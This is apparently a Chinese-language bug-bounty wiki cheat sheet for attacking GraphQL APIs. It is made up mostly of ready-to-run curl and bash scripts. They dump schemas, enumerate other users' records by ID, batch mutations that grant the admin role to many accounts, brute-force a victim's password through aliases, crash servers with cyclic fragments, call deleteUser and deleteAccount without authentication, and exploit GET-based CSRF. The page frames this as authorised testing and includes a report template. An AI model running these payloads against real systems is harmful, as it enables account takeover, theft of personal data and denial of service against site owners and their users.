---
type: wiki
category: attack
tool: graphql
status: active
last-updated: 2026-04-21
---

# GraphQL 深度攻擊速查

> **用途：** GraphQL 常被誤認為「內部 API」導致放寬認證，實測時 unauth introspection + integer IDOR 命中率高。
> 配合 bbflow hunter：`graphql`。

## 先探測

```bash
# 常見 endpoint
for p in /graphql /api/graphql /query /api/query /v1/graphql /gql; do
  curl -sk "https://target.com$p" -X POST -H "Content-Type: application/json" \
       -d '{"query":"{__typename}"}' | grep -o '"__typename":"[^"]*"'
done

# 存在 → 回 {"data":{"__typename":"Query"}}
# 不存在 → 回 404 / 405 / HTML 錯誤頁
```

## 10 種攻擊類別

| # | 攻擊 | 前提 | 嚴重度 |
|---|------|------|-------|
| 1 | Unauth introspection → schema dump | introspection on | P4 (alone) |
| 2 | Field suggestion schema leak | introspection off 但 debug on | P5 |
| 3 | Integer IDOR on ID-based query | 未驗 ownership | P2-P1 |
| 4 | Alias overload → batch IDOR | 同 mutation 多次執行 | P2 |
| 5 | Alias overload → rate limit bypass | login/password reset | P2 |
| 6 | Batched query → DoS via nested | 無 depth limit | P3 |
| 7 | Unauth mutation → data modify | mutation 無 auth | P1 |
| 8 | CSRF on GraphQL（GET enabled）| GET /graphql 接受 | P3 |
| 9 | Error message info disclosure | error 含 stack trace | P4 |
| 10 | Subscription auth bypass | WebSocket auth 差 | P2 |

## 1. Introspection 抓完整 schema

```bash
# 完整 introspection query
cat > /tmp/intro.json << 'EOF'
{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
EOF

curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  --data @/tmp/intro.json > schema.json

# 解析
jq '.data.__schema.types[] | select(.name | test("^[A-Z]")) | .name' schema.json
jq '.data.__schema.mutationType.fields[].name' schema.json
```

### 圖形化

```bash
# 用 GraphQL Voyager 看 schema
docker run -p 3000:3000 graphql-kit/graphql-voyager
# 把 schema.json 貼進去

# 或 InQL (Burp extension)
# 或 graphql-schema-linter schema.json
```

## 2. Field suggestion（introspection off 但仍洩漏）

```bash
# 故意打錯 field name，看 error 有沒有建議
curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d '{"query":"{ userx { id } }"}'

# 若回：
# {"errors":[{"message":"Cannot query field \"userx\" on type \"Query\". Did you mean \"user\", \"users\"?"}]}
# → schema 洩漏（可拼湊出完整結構）
```

自動化：clairvoyance (https://github.com/nikitastupin/clairvoyance)

```bash
pip install clairvoyance
clairvoyance https://target.com/graphql -o schema.json -w wordlist.txt
```

## 3. Integer IDOR

```bash
# 從 schema 找 ID-based query
jq '.data.__schema.queryType.fields[] | select(.args[].name == "id") | .name' schema.json

# 試多個 ID
for id in 1 2 10 100 1000 99999; do
  curl -sk -X POST 'https://target.com/graphql' \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ shipment(id: $id) { id trackingNumber customerName } }\"}" | jq
done

# 若全部回真實資料 → integer IDOR
# 若只有自己的 id 回 → normal access
```

## 4. Alias overload → batch IDOR

### 用途
單一 HTTP request 執行多次 mutation，繞過 per-request rate limit。

```bash
# 一次執行 20 次 mutation
ALIASES=""
for i in {1..20}; do
  ALIASES+="m$i: updateUser(id: $i, role: \"admin\") { id role } "
done

curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"query\":\"mutation { $ALIASES }\"}"
```

## 5. Alias overload → password reset / login brute

```bash
# 一次測 50 個密碼
BATCH=""
for i in {1..50}; do
  BATCH+="a$i: login(email: \"victim@target.com\", password: \"$(sed -n "${i}p" passwords.txt)\") { token } "
done

curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"mutation { $BATCH }\"}"

# 若回傳中有一個 non-null token → 命中
```

繞 rate limit 的邏輯：rate limit 通常在 HTTP layer，一個 request 內的 alias 不算多個 request。

## 6. Query depth DoS

```bash
# 深度 query 耗盡後端資源
QUERY="{ user(id:1) { friends { friends { friends { friends { friends { friends { friends { id } } } } } } } } }"

time curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}"
# 若 timeout > 30s → DoS vector（但 DoS 大廠不收，慎用）

# Cyclic fragment
QUERY='fragment A on User { friends { ...A } } { user(id:1) { ...A } }'
# 多數 GraphQL lib 接受循環 fragment → 直接 crash
```

**注意**：DoS 在絕大多數 bounty program 是 OOS，測之前先確認 scope。

## 7. Unauth mutation

```bash
# 從 schema 找 mutation
jq '.data.__schema.mutationType.fields[].name' schema.json

# 試不帶 auth
for M in deleteUser banUser grantAdmin updateProduct setPrice; do
  RESP=$(curl -sk -X POST 'https://target.com/graphql' \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { $M(id: 1) { id } }\"}")
  echo "$M → $RESP"
done

# 若回 data（非 "unauthorized"）→ P1 unauth mutation
```

## 8. CSRF on GraphQL（GET enabled）

```bash
# 檢查 GET 支援
curl -sk "https://target.com/graphql?query={__typename}"

# 若回 {"data":...} → GET 開啟 → 可 CSRF（<img src=> 或 <form>）

# 更危險：GET 接受 mutation
curl -sk "https://target.com/graphql?query=mutation{deleteAccount}"
# 若 HTTP 200 → CSRF ATO
```

## 9. Error info disclosure

```bash
# 故意爆錯
curl -sk -X POST 'https://target.com/graphql' \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"abc\") { id } }"}'  # 傳錯型別

# 若回 stack trace:
# "errors":[{"message":"...","extensions":{"exception":{"stacktrace":["at /app/src/resolvers/user.js:42:..."]}}}]
# → P4 information disclosure（debug mode 未關）
```

## 10. Subscription WebSocket auth

```bash
# 連 ws://target/graphql 用 subscription
# 有些實作 WebSocket 認證跟 HTTP 不同 → 可能 bypass

wscat -c wss://target.com/graphql -H "Authorization: Bearer $TOKEN"
> {"type":"connection_init","payload":{}}
> {"id":"1","type":"start","payload":{"query":"subscription { userUpdated { id email } }"}}

# 看是否能訂閱到其他 user 的更新
```

## bbflow 整合

```bash
# hunt-graphql-idor 已自動化 §1 §3 §7 §9
bbflow hunt target.com --only graphql

# 手動補：
# §4 §5 alias overload 需要 schema 分析後手作
# §8 GET CSRF 要手動 probe
```

## Nuclei 快篩

```bash
# introspection on
nuclei -u https://target.com/graphql -id graphql-detect,graphql-playground-detect -severity info

# 找 GraphQL endpoints
nuclei -u https://target.com -t http/exposures/apis/graphql-detect.yaml
```

## 輔助工具

| 工具 | URL | 用途 |
|------|-----|------|
| graphw00f | https://github.com/dolevf/graphw00f | GraphQL engine fingerprint |
| clairvoyance | https://github.com/nikitastupin/clairvoyance | schema brute（當 introspection off）|
| InQL | https://github.com/doyensec/inql | Burp extension, schema parser |
| GraphQL Voyager | https://graphql-kit.com/graphql-voyager/ | 視覺化 schema |
| Altair | https://altairgraphql.dev/ | GraphQL client（取代 curl）|
| graphql-path-enum | https://github.com/estheruary/graphql-path-enum | 找 query path 到敏感 field |

## 報告 template

```markdown
## 漏洞概述
https://api.target.com/graphql 在未認證下開啟 GraphQL introspection 並可對 `shipment(id:Int!)` query 做 integer IDOR，未驗證 ownership，任意 id 可讀取他人貨運資料。

## 重現步驟

### Step 1: 確認 endpoint + introspection
curl -sk -X POST 'https://api.target.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}'
# HTTP 200 + types array → introspection ON

### Step 2: 從 schema 找 ID-based query
jq '.data.__schema.queryType.fields[] | select(.args[].name == "id") | .name' schema.json
# → shipment, order, invoice, user

### Step 3: IDOR PoC
for id in 1 100 1000 99999; do
  curl -sk -X POST 'https://api.target.com/graphql' \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ shipment(id:$id) { id trackingNumber customerName } }\"}"
done
# 每個 id 都回真實資料（customerName 不同人）

## Impact
- 任意未認證使用者可讀取全站 shipment 資料
- 經驗 id 1 到 99999 採用連續序列（非測試資料）
- 每筆含 customerName / trackingNumber（PII）

## Severity
P2/High
```

## 關聯文件

- [../hunters/hunt-graphql-idor.sh](../hunters/hunt-graphql-idor.sh)
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md)
- [40-checklist-new-target.md](40-checklist-new-target.md) § Phase 2 API discovery
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
